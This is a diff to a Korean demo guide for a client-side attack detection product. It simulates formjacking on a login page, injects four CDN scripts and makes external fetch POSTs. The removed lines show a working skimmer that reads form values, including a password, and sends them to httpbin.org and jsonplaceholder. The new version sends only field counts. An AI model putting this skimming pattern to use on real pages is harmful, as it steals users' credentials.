@@ -22,12 +22,11 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
     // Phase 1: Harvest all form fields (CSD tracks field reads on page-load DOM fields)
     console.log('\\n[Formjack] Phase 1: Form field harvesting');
     var inputs = document.querySelectorAll('input');
-    var harvested = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
     });
-    console.log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+    console.log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
     // Phase 2: Inject third-party scripts from 4 CDN domains
     console.log('\\n[Supply Chain] Phase 2: Multi-CDN script injection');
@@ -50,12 +49,13 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
         console.log('[Supply Chain] Injected script tag: ' + cdn.name);
     });
 
-    // Phase 3: Exfiltrate harvested data to external endpoints
+    // Phase 3: Send synthetic counters to external endpoints
     console.log('\\n[Exfil] Phase 3: Data exfiltration');
     var payload = JSON.stringify({
         type: 'combined_demo',
-        credentials: harvested,
-        page: window.location.href,
+        field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true,
         timestamp: Date.now()
     });
 
@@ -64,7 +64,7 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
         mode: 'no-cors',
         body: payload
     }).then(function() {
-        console.log('[Exfil] Data sent to www.httpbin.org');
+        console.log('[Exfil] Synthetic signal sent to www.httpbin.org');
     });
 
     fetch('https://jsonplaceholder.typicode.com/posts', {
@@ -73,13 +73,13 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
         headers: { 'Content-Type': 'application/json' },
         body: payload
     }).then(function() {
-        console.log('[Exfil] Data sent to jsonplaceholder.typicode.com');
+        console.log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com');
     });
 
     // Summary
     console.log('\\n' + '='.repeat(50));
     console.log('[CSD Demo] Simulation complete');
-    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
     console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (4 CDN domains)');
     console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
     console.log('[CSD Demo] Detection takes 5-10 minutes to appear in the CSD console.');
@@ -95,7 +95,7 @@ CSD는 브라우저 내부의 JavaScript 동작을 모니터링합니다. WAF �
 <Steps>
 1. `https://botdemo.sales-demo.f5demos.com/#/login`에서 Juice Shop **로그인 페이지**로 이동합니다.
 
-2. 폼 필드에 더미 자격 증명을 입력합니다 — **Email** 필드에 `test@example.com`을, **Password** 필드에 `P@ssword123`을 입력합니다 (폼을 제출하지 마십시오).
+2. 폼 필드에 더미 자격 증명을 입력합니다 — **Email** 필드에 `test@example.com`을, **Password** 필드에 `<DEMO_PASSWORD>`을 입력합니다 (폼을 제출하지 마십시오).
 
 3. DevTools를 엽니다 (**F12** &rarr; **Console** 탭)
 
@@ -139,7 +139,7 @@ var _poll = _si(function() {
       window.HTMLInputElement.prototype, 'value').set;
     nativeSet.call(emailEl, 'test@example.com');
     emailEl.dispatchEvent(new Event('input', { bubbles: true }));
-    nativeSet.call(passEl, 'P@ssword123');
+    nativeSet.call(passEl, '<DEMO_PASSWORD>');
     passEl.dispatchEvent(new Event('input', { bubbles: true }));
 
     // Run Combined Detection Script inline using native fetch for exfil
@@ -150,12 +150,11 @@ var _poll = _si(function() {
 
       _log('\n[Formjack] Phase 1: Form field harvesting');
       var inputs = document.querySelectorAll('input');
-      var harvested = {};
+      var populatedFieldCount = 0;
       inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
       });
-      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+      _log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
       _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
       var cdns = [
@@ -175,19 +174,20 @@ var _poll = _si(function() {
 
       _log('\n[Exfil] Phase 3: Data exfiltration');
       var payload = JSON.stringify({
-        type: 'combined_demo', credentials: harvested,
-        page: window.location.href, timestamp: Date.now()
+        type: 'combined_demo', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
       });
       _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
-        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+        .then(function() { _log('[Exfil] Synthetic signal sent to www.httpbin.org'); });
       _fetch('https://jsonplaceholder.typicode.com/posts', {
         method: 'POST', mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' }, body: payload
-      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+      }).then(function() { _log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com'); });
 
       _log('\n==================================================');
       _log('[CSD Demo] Simulation complete');
-      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
       _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
       _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
       _log('==================================================');
@@ -220,7 +220,7 @@ var _poll = _si(function() {
 | --- | --- | --- |
 | **필드 수집** | 기존 `input` 요소(이메일, 비밀번호)에서 값을 읽음 | 민감한 폼 필드를 읽는 스크립트 — 고위험으로 플래그 지정 |
 | **스크립트 주입** | `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`에서 로드하는 4개의 `<script>` 태그를 추가 | 페이지의 4개 새로운 서드파티 스크립트 도메인 |
-| **데이터 유출** | `fetch`를 통해 수집된 데이터를 `www.httpbin.org` 및 `jsonplaceholder.typicode.com`으로 전송 | 외부 도메인으로의 네트워크 호출 (참고: fetch 대상은 Network 도메인 보기가 아닌 스크립트 네트워크 인터랙션으로 표시됨) |
+| **합성 네트워크 신호** | `fetch`로 필드 수와 폐기 표시를 전송하며 필드 값은 페이로드에 포함하지 않음 | 외부 도메인으로의 네트워크 호출 (참고: fetch 대상은 Network 도메인 보기가 아닌 스크립트 네트워크 인터랙션으로 표시됨) |
 
 <Aside type="note">
 CSD에는 특정 탐지 경계가 있습니다 — 예를 들어, 페이지 로드 DOM 필드만 추적되고 Network 보기에는 스크립트 로드 도메인만 표시됩니다. 전체 목록은 [탐지 경계](/csd/ko/overview/#detection-boundaries)를 참조하십시오.
